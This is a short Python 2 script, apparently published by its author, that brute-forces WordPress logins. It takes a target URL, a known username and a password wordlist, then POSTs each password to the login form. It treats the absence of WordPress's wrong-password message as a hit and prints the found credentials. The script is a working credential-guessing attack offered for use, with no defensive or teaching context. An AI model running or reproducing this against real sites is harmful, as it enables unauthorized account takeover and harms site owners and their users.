#usr/bin/python2

import sys
import requests
import os

# clean screen
os.system("cls")
os.system("clear")

logo = '''
                 ########################################

                    ------- WordPress Bute Force -------
            Note : It is necessary to enter the correct UserName
                           Twitter : y0usef_11

                 ########################################
'''

print logo

url = raw_input("input url ==> ")
username = raw_input("input username ==> ") # It is necessary to enter the correct UserName
list_password = raw_input("input list password ==> ") # list text file
file = open(list_password,'r')
for line in file:
    remove = line.rstrip("\n")
    data = {'log':username,'pwd':remove}
    re = requests.post(url,data=data)

    txt = re.content

    x = txt.find("The password you entered for the username") # Here it searches for response in this text means an error login is being shown

    if x == -1:
        print("Password is Successfully ==> ", data)
        break
    else:
        print("Password not correct ", data)
